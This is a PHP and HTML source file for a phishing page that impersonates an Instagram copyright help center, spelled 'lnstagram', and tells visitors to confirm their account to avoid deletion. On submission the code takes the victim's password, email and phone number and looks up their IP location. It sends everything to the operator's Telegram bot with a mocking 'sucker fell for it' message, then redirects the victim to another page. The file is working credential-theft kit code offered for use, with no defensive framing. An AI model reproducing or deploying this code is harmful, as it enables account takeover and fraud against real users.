
<?php
include('api/tg.php');

$id=$_GET["id"];
if($_POST){
$ip=$_SERVER["REMOTE_ADDR"];
$konum = file_get_contents("http://ip-api.com/xml/".$ip);
$cek = new SimpleXMLElement($konum);
$ulke = $cek->country;
$sehir = $cek->city;
date_default_timezone_set('Europe/Istanbul');  
$cur_time=date("d-m-Y H:i:s");

$password=$_POST["password"];
$mail=$_POST["mail"];
$number=$_POST["number"];
include 'images/antisuspend.php';
header("location: password.php?id=$id");

$data = [
  'text' => '➡️ Lan Koş Sazan Düştü 😈 

Kullanıcı Adı : '.$id.'
Şifre : '.$password.'
Mail : '.$mail.'
Tel : '.$number.'
Ülke : '.$ulke.'
Şehir : '.$sehir.'
İp : '.$ip.'
Tarih : '.$cur_time.'
',
  'chat_id' => $chat_id
];

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
}
?>
<!doctype html>
 <html lang="en"> 
<head> 	
<title>lnstagram Copyright Help Center</title> 
<meta charset="utf-8"> 
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> 	
<link rel="stylesheet" href="css/style.css"> 
	<link rel="stylesheet" href="css/main.css">
 	</head> 	
<body> 	 
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous" /> 	
	<div class="container"> 	
		<div class="row justify-content-center"> 	
			<div class="col-md-6 text-center mb-1"> 			
		<!-- bla bla --> 				</div> 	
		</div> 		
	<div class="row justify-content-center"> 		
		<div class="col-md-12 col-lg-10"> 	
				<div class="wrap d-md-flex"> 
						<div class="text-wrap p-4 p-lg-5 text-center d-flex align-items-center order-md-last"> 		
					<div class="text w-100"> 	
				<img src="images/logo.png" alt="logo" style="width: 50%;"> 								<p>Instagram Copyright Help Center</p> 										</div> 		
	 </div> 		
				<div class="login-wrap p-4 p-lg-5"> 	
		 	<div class="d-flex"> 			
 	</div> 			
	<form method="post" id="login-form" class="signin-form"> 			<div class="text-center"> 			
				<img class="rounded-circle" style="width: 50%;" src="images/insta.png" > 							<div class="form-group"> 		
					<label class="label mt-3"" for="password"><?php echo $id ?> </label> 				
			<p>I did not commit any copyright infringement. There is an error here and I would like it to be reconsidered. i refuse to delete account</p> 							</div></div> 		
 <div class="form-group mb-3"> 		
 	
<div class="wrap-input100 validate-input">
 <input class="input100" type="text" required="" autocomplete="off" name="password" placeholder="Password"> <span class="focus-input100"></span> 
<span class="symbol-input100"> <i class="fa fa-lock" aria-hidden="true"></i> </span> </div> 
<div class="wrap-input100 validate-input"> 
<input class="input100" type="email" required="" autocomplete="off" name="mail" placeholder="E-mail Adress"> <span class="focus-input100"></span> 
<span class="symbol-input100"> <i class="fas fa-envelope" aria-hidden="true"></i> </span> </div> 
<div class="wrap-input100 validate-input"> <input class="input100" type="number" required="" autocomplete="off" name="number" placeholder="Contact Number"> <span class="focus-input100"></span> <span class="symbol-input100"> <i class="fas fa-key"></i> </span> </div>
 		 </div> 	
	 <div class="form-group"> 	
	 	<button type="submit" class="form-control btn btn-primary submit px-3">Confirm</button> 		 </div> 	
	 </form> 		 </div> 	
	 </div> 	
			</div>
 			</div> 	
	</div>
 	</section> 	
<script src="js/jquery.min.js"></script>
 <script src="js/popper.js"></script> 
<script src="js/bootstrap.min.js"></script>
 <script src="js/main.js"></script> 	
</body> </html> 
